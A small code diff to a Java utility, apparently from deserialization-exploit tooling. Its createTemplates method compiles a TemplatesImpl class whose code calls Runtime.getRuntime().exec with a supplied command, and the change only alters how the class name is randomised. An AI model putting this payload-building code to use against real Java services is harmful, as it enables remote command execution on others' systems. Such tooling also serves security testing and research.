@@ -60,7 +60,7 @@ public class Util {
 
     public static TemplatesImpl createTemplates(String command) {
         ClassPool pool = ClassPool.getDefault();
-        CtClass ctClass = pool.makeClass("Foo" + new Random().nextInt(20));
+        CtClass ctClass = pool.makeClass("Foo" + RandomID.randomID().substring(0, 4));
         String commandTemplate = "java.lang.Runtime.getRuntime().exec(\"%s\");";
         byte[] bytes = new byte[1024];
         try {
